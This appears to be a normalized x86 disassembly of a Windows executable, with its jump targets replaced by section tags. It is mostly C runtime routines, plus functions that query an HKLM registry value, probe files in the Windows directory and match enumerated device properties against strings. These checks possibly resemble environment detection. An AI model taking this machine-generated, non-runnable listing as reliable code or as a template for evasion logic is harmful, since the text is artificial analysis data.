mov [ esp + 0x11 ] eax
mov [ esp + 0x15 ] eax
mov [ esp + 0x19 ] ax
mov [ esp + 0x1b ] al
mov [ esp + 0x10 ] dl
mov ecx 0xe
mov esi r--data
lea edi [ esp + 0x1c ]
[ edi ] [ esi ]
push 0xca
push eax
lea eax [ esp + 0x5e ]
push eax
movsw [ edi ] [ esi ]
call sub_40b0d0
push 0x1
lea ecx [ esp + 0x18 ]
call sub_404780
mov ecx [ esp + 0x130 ]
add esp 0x10
pop edi
pop esi
xor ecx esp
call sub_4061c0
add esp 0x11c
retn
sub_404500
push ecx
push esi
push r--data
push r--data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
jne r-xdata
lea eax [ esp + 0x4 ]
push eax
call [ GetCurrentProcess@IAT ]
push eax
call esi
mov eax [ esp + 0x4 ]
pop esi
pop ecx
retn
pop esi
pop ecx
retn
sub_404540
xor eax eax
test ecx ecx
je r-xdata
mov eax 0x80070057
cmp ecx 0x7fffffff
jbe r-xdata
retn
push ebx
push esi
lea esi [ ecx - 0x1 ]
mov ecx [ esp + 0xc ]
lea eax [ esp + 0x10 ]
push eax
push ecx
push esi
push edi
xor ebx ebx
call sub_406ced
add esp 0x10
test eax eax
jl r-xdata
test eax eax
jl r-xdata
mov [ esi + edi ] bl
mov ebx 0x8007007a
cmp eax esi
ja r-xdata
jne r-xdata
pop esi
mov eax ebx
pop ebx
mov [ esi + edi ] bl
pop esi
mov eax ebx
pop ebx
retn
sub_4045a0
xor eax eax
push esi
mov esi ecx
test ecx ecx
je r-xdata
mov eax 0x80070057
lea esp [ esp ]
pop esi
retn
test eax eax
jl r-xdata
test ecx ecx
jne r-xdata
inc edx
sub ecx 0x1
jne r-xdata
mov [ edi ] 0x0
sub esi ecx
mov [ edi ] esi
pop esi
retn
test edi edi
je r-xdata
cmp [ edx ] al
je r-xdata
jmp r-xdata
sub_4045e0
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov esi 0x7fffffff
test edx edx
je r-xdata
pop edi
dec ecx
pop esi
mov eax 0x8007007a
mov [ ecx ] 0x0
pop ebx
retn
test esi esi
je r-xdata
test edx edx
jne r-xdata
mov bl [ edi ]
test bl bl
je r-xdata
pop edi
pop esi
mov [ ecx ] al
pop ebx
retn
mov [ ecx ] bl
dec edx
inc ecx
inc edi
dec esi
test edx edx
jne r-xdata
pop edi
dec ecx
pop esi
mov eax 0x8007007a
mov [ ecx ] dl
pop ebx
retn
sub_404640
sub esp 0x218
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x214 ] eax
push ebp
mov ebp [ esp + 0x220 ]
push esi
push edi
push 0xe0
lea eax [ esp + 0x40 ]
push 0x0
mov ecx 0x9
mov esi r--data
lea edi [ esp + 0x20 ]
push eax
[ edi ] [ esi ]
call sub_40b0d0
push 0x103
lea ecx [ esp + 0x12d ]
push 0x0
push ecx
mov [ esp + 0x134 ] 0x0
call sub_40b0d0
add esp 0x18
lea edi [ esp + 0xc ]
mov ecx 0x104
lea edx [ esp + 0x18 ]
mov [ esp + 0x10 ] 0x1
call sub_4045a0
test eax eax
jl r-xdata
lea edx [ esp + 0xc ]
push edx
push 0x20019
push 0x0
lea eax [ esp + 0x24 ]
push eax
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
mov edx 0x104
sub edx eax
lea ecx [ esp + eax + 0x18 ]
mov eax ebx
call sub_4045e0
pop edi
pop esi
xor eax eax
pop ebp
mov ecx [ esp + 0x214 ]
xor ecx esp
call sub_4061c0
add esp 0x218
retn
lea ecx [ esp + 0x14 ]
push ecx
mov ecx [ esp + 0x10 ]
lea edx [ esp + 0x120 ]
push edx
lea eax [ esp + 0x18 ]
push eax
push 0x0
push r--data
push ecx
mov [ esp + 0x2c ] 0x104
call [ RegQueryValueExA@IAT ]
lea edx [ esp + 0x11c ]
push edx
push ebp
call sub_406acb
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esp + 0xc ]
push ecx
call [ RegCloseKey@IAT ]
mov ecx [ esp + 0x220 ]
pop edi
pop esi
pop ebp
xor ecx esp
mov eax 0x1
call sub_4061c0
add esp 0x218
retn
mov eax [ esp + 0xc ]
push eax
call [ RegCloseKey@IAT ]
sub_404780
sub esp 0x20c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x208 ] eax
push ebx
push esi
xor esi esi
mov ebx ecx
cmp [ esp + 0x218 ] esi
jbe r-xdata
mov ecx [ esp + 0x210 ]
xor eax eax
cmp esi [ esp + 0x218 ]
pop esi
sete al
pop ebx
xor ecx esp
call sub_4061c0
add esp 0x20c
retn
push ebp
mov ebp [ GetWindowsDirectoryA@IAT ]
push edi
jmp r-xdata
lea eax [ ebx + 0x14 ]
push eax
call sub_404640
add esp 0x4
test eax eax
je r-xdata
pop edi
pop ebp
push 0x104
lea ecx [ esp + 0x14 ]
push ecx
call ebp
push ebx
lea edx [ esp + 0x14 ]
push edx
push r--data
mov ecx 0x104
lea edi [ esp + 0x120 ]
call sub_404540
add esp 0xc
push 0x0
push 0x0
push 0x3
push 0x0
push 0x0
push 0x80000000
mov eax edi
push eax
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
je r-xdata
push eax
call [ CloseHandle@IAT ]
inc esi
add ebx 0x118
cmp esi [ esp + 0x220 ]
jb r-xdata
sub_404850
sub esp 0x154
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x150 ] eax
mov eax [ esp + 0x158 ]
push ebx
push ebp
push esi
push edi
xor esi esi
push 0x12
push esi
push esi
push r--data
mov [ esp + 0x30 ] eax
mov [ esp + 0x28 ] esi
call [ SetupDiGetClassDevsA@IAT ]
mov ebp [ SetupDiGetDeviceInterfaceDetailA@IAT ]
mov ebx [ SetupDiGetDeviceRegistryPropertyA@IAT ]
mov edi eax
mov [ esp + 0x40 ] 0x1c
mov [ esp + 0x10 ] esi
call [ GetLastError@IAT ]
cmp eax 0x103
je r-xdata
push 0x103
lea eax [ esp + 0x61 ]
push 0x0
push eax
mov [ esp + 0x68 ] 0x0
call sub_40b0d0
add esp 0xc
push 0x0
lea ecx [ esp + 0x18 ]
push ecx
push 0x0
push 0x0
lea edx [ esp + 0x50 ]
push edx
push edi
call ebp
mov eax [ esp + 0x14 ]
push 0x4
push 0x1000
push eax
push 0x0
call [ VirtualAlloc@IAT ]
mov esi eax
test esi esi
je r-xdata
push edi
call [ SetupDiDestroyDeviceInfoList@IAT ]
mov ecx [ esp + 0x160 ]
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_4061c0
add esp 0x154
retn
inc [ esp + 0x10 ]
jmp r-xdata
xor eax eax
mov [ esi ] 0x5
lea ecx [ esp + 0x24 ]
push ecx
mov [ esp + 0x28 ] eax
lea edx [ esp + 0x18 ]
push edx
mov [ esp + 0x30 ] eax
mov [ esp + 0x34 ] eax
mov [ esp + 0x38 ] eax
mov [ esp + 0x3c ] eax
mov [ esp + 0x40 ] eax
mov [ esp + 0x44 ] eax
mov eax [ esp + 0x1c ]
push eax
push esi
lea ecx [ esp + 0x50 ]
push ecx
push edi
mov [ esp + 0x3c ] 0x1c
call ebp
push 0x0
push 0x104
lea edx [ esp + 0x64 ]
push edx
lea eax [ esp + 0x28 ]
push eax
push 0x4
lea ecx [ esp + 0x38 ]
push ecx
push edi
call ebx
lea edx [ esp + 0x5c ]
push r--data
push edx
call sub_406acb
add esp 0x8
test eax eax
je r-xdata
mov edx [ esp + 0x10 ]
lea ecx [ esp + 0x40 ]
push ecx
push edx
push r--data
push 0x0
push edi
call [ SetupDiEnumDeviceInterfaces@IAT ]
test eax eax
je r-xdata
push 0x0
push 0x104
lea eax [ esp + 0x64 ]
push eax
lea ecx [ esp + 0x28 ]
push ecx
push 0xc
lea edx [ esp + 0x38 ]
push edx
push edi
call ebx
mov eax [ esp + 0x20 ]
push eax
lea ecx [ esp + 0x60 ]
push ecx
call sub_406c23
add esp 0x8
test eax eax
je r-xdata
push 0x8000
push 0x0
push esi
call [ VirtualFree@IAT ]
jmp r-xdata
push 0x8000
push 0x0
push esi
call [ VirtualFree@IAT ]
cmp [ esp + 0x18 ] 0x0
je r-xdata
mov [ esp + 0x18 ] 0x1
sub_404a6a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_4079da
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_40769d
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_406f30
mov [ esi + 0x4 ] eax
sub_404af1
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
movzx ecx [ edx ]
lea edi [ ecx - 0x41 ]
inc edx
cmp edi 0x19
ja r-xdata
add eax 0x20
test eax eax
je r-xdata
add ecx 0x20
pop edi
sub eax ecx
pop esi
pop ebp
retn
cmp eax ecx
je r-xdata
movzx eax [ esi ]
lea ecx [ eax - 0x41 ]
inc esi
cmp ecx 0x19
ja r-xdata
sub_404b2a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_404a6a
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_407f64
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_407efc
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_407f64
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_407efc
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
push edi
push [ ebp + 0x8 ]
call sub_404af1
pop ecx
pop ecx
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
sub esi eax
mov eax esi
pop esi
cmp esi eax
je r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_407cb0
inc [ ebp + 0x8 ]
mov esi eax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_407cb0
add esp 0x10
inc edi
cmp esi ebx
je r-xdata
sub_404bff
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_404b2a
add esp 0xc
cmp [ ebp + 0x8 ] esi
jne r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
call sub_407f64
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_407efc
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
pop esi
pop ebp
jmp sub_404af1
pop esi
pop ebp
retn
sub_404c51
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0xc ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_407f64
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_407efc
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
push eax
push ebx
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x1c ] 0x7fffffff
mov [ ebp - 0x14 ] 0x42
call sub_4081b7
add esp 0x10
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
pop ebx
leave
retn
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_407fad
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax esi
pop esi
sub_404cce
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
push edi
cmp ebx 0x4
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
lea edi [ ebx - 0x4 ]
test edi edi
jbe r-xdata
pop ebx
leave
retn
cmp [ ebp - 0x4 ] ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop edi
inc eax
inc ecx
inc [ ebp - 0x4 ]
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] edi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
sub_404d8e
push 0xc
push r--data
call sub_4099f4
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_409a39
retn
cmp [ rw-data ] 0x3
jne r-xdata
push esi
push 0x4
call sub_408efb
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_408f2e
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
call sub_407f64
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_407f22
mov [ esi ] eax
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_404de4
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
push esi
push eax
call sub_408f5e
pop ecx
pop ecx
push [ ebp + 0x8 ]
jmp r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
sub_404e1c
push 0xc
push r--data
call sub_4099f4
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0x8 ]
cmp esi [ rw-data ]
ja r-xdata
mov eax [ ebp - 0x1c ]
call sub_409a39
retn
push 0x4
call sub_408efb
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_40970d
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_404e62
sub_404e6b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xffffffe0
ja r-xdata
push esi
call sub_409dcf
pop ecx
call sub_407f64
mov [ eax ] 0xc
xor eax eax
push ebx
push edi
mov edi [ HeapAlloc@IAT ]
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
call sub_409d87
push 0x1e
call sub_409bdc
push 0xff
call sub_406318
cmp eax 0x3
jne r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
push esi
call sub_404e1c
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
mov eax esi
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
inc esi
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
push [ rw-data ]
call edi
push eax
jmp r-xdata
pop edi
mov eax ebx
pop ebx
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
pop esi
pop ebp
retn
call sub_407f64
mov [ eax ] esi
push [ ebp + 0x8 ]
call sub_409dcf
pop ecx
test eax eax
je r-xdata
call sub_407f64
mov [ eax ] esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
sub_404f40
mov ecx [ esp + 0x8 ]
push edi
push ebx
push esi
mov dl [ ecx ]
mov edi [ esp + 0x10 ]
test dl dl
je r-xdata
mov eax edi
pop esi
pop ebx
pop edi
retn
mov dh [ ecx + 0x1 ]
test dh dh
je r-xdata
xor eax eax
pop esi
pop ebx
pop edi
mov al dl
jmp sub_409e16
mov esi edi
mov ecx [ esp + 0x14 ]
mov al [ edi ]
add esi 0x1
cmp al dl
je r-xdata
mov al [ esi ]
add esi 0x1
cmp al dh
jne r-xdata
test al al
je r-xdata
cmp al dl
je r-xdata
lea edi [ esi - 0x1 ]
pop esi
pop ebx
pop edi
xor eax eax
retn
mov al [ esi ]
add esi 0x1
test al al
jne r-xdata
lea eax [ edi - 0x1 ]
pop esi
pop ebx
pop edi
retn
mov al [ esi ]
add esi 0x2
cmp al ah
jne r-xdata
mov al [ ecx + 0x3 ]
test al al
je r-xdata
mov ah [ esi - 0x1 ]
add ecx 0x2
cmp al ah
je r-xdata
mov ah [ ecx + 0x2 ]
test ah ah
je r-xdata
jmp r-xdata
sub_404ff0
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
push esi
push ebx
mov ebx ecx
mov esi [ esp + 0x14 ]
test esi 0x3
mov edi [ esp + 0x10 ]
jne r-xdata
mov al [ esi ]
add esi 0x1
mov [ edi ] al
add edi 0x1
sub ecx 0x1
je r-xdata
shr ecx 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test al al
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
test edi 0x3
je r-xdata
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
sub ecx 0x1
je r-xdata
test dl dl
je r-xdata
mov al [ esi ]
add esi 0x1
mov [ edi ] al
add edi 0x1
test al al
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
and ebx 0x3
je r-xdata
xor edx edx
mov [ edi ] edx
test dh dh
je r-xdata
sub ebx 0x1
jne r-xdata
sub ebx 0x1
jne r-xdata
xor eax eax
mov [ edi ] al
add edi 0x1
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edi 0x3
jne r-xdata
and ebx 0x3
jne r-xdata
and edx 0xff
mov [ edi ] edx
jmp r-xdata
test edx 0xff0000
je r-xdata
pop ebx
pop esi
mov [ edi ] eax
add edi 0x4
sub ecx 0x1
jne r-xdata
add edi 0x4
xor eax eax
sub ecx 0x1
je r-xdata
and edx 0xffff
mov [ edi ] edx
jmp r-xdata
test edx 0xff000000
jne r-xdata
mov [ edi ] edx
jmp r-xdata
sub_405114
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov [ ebp - 0x2c ] eax
call sub_4079da
push 0x8
pop ecx
mov [ ebp - 0x28 ] eax
xor eax eax
lea edi [ ebp - 0x24 ]
push 0x7
[ edi ]
pop edi
mov dl [ esi ]
movzx ecx dl
mov eax ecx
and ecx edi
mov bl 0x1
shl bl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
inc esi
test dl dl
jne r-xdata
mov edx [ ebp - 0x2c ]
test edx edx
jne r-xdata
mov al [ edx ]
movzx esi al
xor ebx ebx
mov ecx esi
and ecx edi
inc ebx
shl ebx cl
shr esi 0x3
mov cl [ ebp + esi - 0x24 ]
test cl bl
jne r-xdata
mov eax [ ebp - 0x28 ]
mov edx [ eax + 0x18 ]
jmp r-xdata
test al al
je r-xdata
mov ebx edx
jmp r-xdata
inc edx
cmp [ edx ] 0x0
jne r-xdata
movzx esi [ edx ]
xor eax eax
mov ecx esi
and ecx edi
inc eax
shl eax cl
shr esi 0x3
mov cl [ ebp + esi - 0x24 ]
test cl al
jne r-xdata
jmp r-xdata
mov [ edx ] 0x0
inc edx
inc edx
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov eax ebx
sub eax edx
neg eax
sbb eax eax
pop edi
and eax ebx
pop esi
xor ecx ebp
pop ebx
call sub_4061c0
leave
retn
sub_4051d5
push 0xc
push r--data
call sub_4099f4
xor ebx ebx
mov [ ebp - 0x1c ] ebx
xor eax eax
mov edi [ ebp + 0x8 ]
cmp edi ebx
setne al
cmp eax ebx
jne r-xdata
xor eax eax
mov esi [ ebp + 0xc ]
cmp esi ebx
setne al
cmp eax ebx
je r-xdata
call sub_407f64
mov [ eax ] 0x16
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_407efc
add esp 0x14
xor eax eax
cmp [ esi ] bl
setne al
cmp eax ebx
je r-xdata
call sub_409a39
retn
call sub_40a5a6
mov [ ebp + 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x4 ] ebx
cmp [ edi ] bl
jne r-xdata
call sub_407f64
mov [ eax ] 0x18
jmp r-xdata
push eax
push [ ebp + 0x10 ]
push esi
push edi
call sub_40a2dd
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40528f
mov eax [ ebp - 0x1c ]
call sub_407f64
mov [ eax ] 0x16
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_40a6e0
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
sub_4052b0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
xor edi edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0x10 ] edi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] edi
je r-xdata
cmp ecx edi
jne r-xdata
mov esi [ ebp + 0x18 ]
cmp esi edi
je r-xdata
call sub_407f64
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
push edi
cmp ebx 0xffffffff
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp [ ebp + 0x14 ] eax
jbe r-xdata
cmp esi edi
je r-xdata
push ebx
push edi
push ecx
call sub_40b0d0
add esp 0xc
mov edi [ ebp + 0x10 ]
imul edi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
mov [ ebp - 0x10 ] edi
mov ebx edi
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp [ ebp + 0x14 ] eax
ja r-xdata
mov [ ebp - 0xc ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
test [ esi + 0xc ] 0x10c
je r-xdata
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp - 0xc ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push esi
call sub_40a833
pop ecx
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
jl r-xdata
mov eax edi
sub eax ebx
xor edx edx
div [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
cmp ebx eax
ja r-xdata
mov ecx 0x7fffffff
xor edx edx
cmp ebx ecx
jbe r-xdata
or [ esi + 0xc ] 0x20
mov edi ebx
cmp ebx eax
jb r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
mov ecx [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
mov [ ecx ] al
mov eax [ esi + 0x18 ]
dec ebx
dec [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
cmp eax [ ebp - 0x4 ]
ja r-xdata
mov eax ebx
mov eax ebx
div [ ebp - 0xc ]
mov eax ebx
mov eax ecx
div [ ebp - 0xc ]
mov eax ecx
jmp r-xdata
cmp edi [ ebp - 0x4 ]
ja r-xdata
mov edi eax
call sub_407f64
mov [ eax ] 0x22
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_40b0d0
add esp 0xc
push eax
push [ ebp - 0x8 ]
push esi
call sub_40b01d
pop ecx
push eax
call sub_40af20
add esp 0xc
test eax eax
je r-xdata
sub eax edx
jmp r-xdata
xor esi esi
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
push edi
push [ esi ]
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
call sub_40b04f
sub [ esi + 0x4 ] edi
add [ esi ] edi
add [ ebp - 0x8 ] edi
sub ebx edi
add esp 0x10
sub [ ebp - 0x4 ] edi
mov edi [ ebp - 0x10 ]
jmp r-xdata
call sub_407efc
add esp 0x14
or [ esi + 0xc ] 0x10
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
call sub_407f64
push esi
push esi
push esi
push esi
mov [ eax ] 0x22
push esi
jmp r-xdata
push [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_40b0d0
add esp 0xc
test ebx ebx
jne r-xdata
add [ ebp - 0x8 ] eax
sub ebx eax
sub [ ebp - 0x4 ] eax
jmp r-xdata
sub_4054ba
push 0xc
push r--data
call sub_4099f4
xor esi esi
mov [ ebp - 0x1c ] esi
cmp [ ebp + 0x10 ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] esi
je r-xdata
cmp [ ebp + 0x18 ] esi
jne r-xdata
push [ ebp + 0x18 ]
call sub_40a1ff
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4052b0
add esp 0x14
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405546
mov eax [ ebp - 0x1c ]
jmp r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
call sub_409a39
retn
call sub_407f64
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_407efc
add esp 0x14
push [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_40b0d0
add esp 0xc
sub_4055b0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_4055dd
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_404a6a
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_407f64
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_40b554
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x2
lea eax [ ebp - 0x18 ]
push eax
push 0x2
push ebx
call sub_40b59f
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xd0 ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
